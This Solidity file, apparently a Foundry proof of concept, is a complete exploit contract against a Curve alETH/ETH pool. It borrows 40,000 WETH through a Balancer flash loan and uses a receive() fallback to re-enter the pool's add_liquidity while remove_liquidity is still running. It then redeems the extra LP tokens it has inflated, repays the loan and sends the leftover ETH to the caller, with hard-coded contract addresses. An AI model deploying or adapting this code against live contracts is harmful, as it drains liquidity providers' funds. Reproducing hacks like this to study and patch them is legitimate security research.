// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "./interfaces/BalancerVault.sol";
import "./interfaces/WETH.sol";
import "./interfaces/StableSwap.sol";
import "forge-std/console.sol";

contract CurveALEthExploit is IFlashLoanRecipient {
    IVault vault = IVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    IWETH weth = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IStableSwap pair = IStableSwap(0xC4C319E2D4d66CcA4464C0c2B32c9Bd23ebe784e);

    bool private stopReciveFallback = false;
    address private exploiter;

    constructor() {}

    function execute() external {
        exploit1();
    }

    function exploit1() internal {
        console.log("Exploit1");
        //Flashloan WETH from Balancer Vault
        exploiter = msg.sender;
        uint256 loanAmount = 40000 ether;
        IERC20[] memory tokens = new IERC20[](1);
        tokens[0] = IERC20(address(weth));
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = loanAmount;
        vault.flashLoan(this, tokens, amounts, "");

        // exploit2=>exploit3=>exploit2
    }

    //Call in flashloan
    function exploit2(uint256 amount) internal {
        console.log("Exploit2");
        // withdraw ETH from WETH
        stopReciveFallback = true;
        weth.withdraw(amount);
        stopReciveFallback = false;

        //add liquidity to Curve ALEth pool
        uint256[2] memory amounts = [amount, 0];
        pair.add_liquidity{value: amount}(amounts, 0);
        uint256 balance = pair.balanceOf(address(this));

        uint256[2] memory minAmounts = [uint256(0), uint256(0)];
        pair.remove_liquidity(balance, minAmounts);
        // exploit3

        console.log("Back to Exploit2");

        uint256 balance2 = pair.balanceOf(address(this));
        uint256 totalSupply = pair.totalSupply();
        console.log(balance2, totalSupply);
        uint256 burnAmount = balance2 > totalSupply ? totalSupply : balance2; // Choice min(balance, totalSupply)

        stopReciveFallback = true;
        pair.remove_liquidity_one_coin(burnAmount, 0, 0);
        stopReciveFallback = false;

        // repay flashloan
        weth.deposit{value: amount}();
        weth.transfer(msg.sender, amount);
        payable(exploiter).transfer(address(this).balance);
    }

    // Call in recive remove_liquidity return ETH
    function exploit3(uint256 amount) internal {
        console.log("Exploit3");
        //add liquidity to Curve ALEth pool
        uint256[2] memory amounts = [amount, 0];
        pair.add_liquidity{value: amount}(amounts, 0);
    }

    function receiveFlashLoan(
        IERC20[] memory,
        uint256[] memory amounts,
        uint256[] memory,
        bytes memory
    ) external {
        console.log("receiveFlashLoan");
        exploit2(amounts[0]);
    }

    receive() external payable {
        console.log("receive");
        if (stopReciveFallback) return;
        exploit3(msg.value);
    }
}
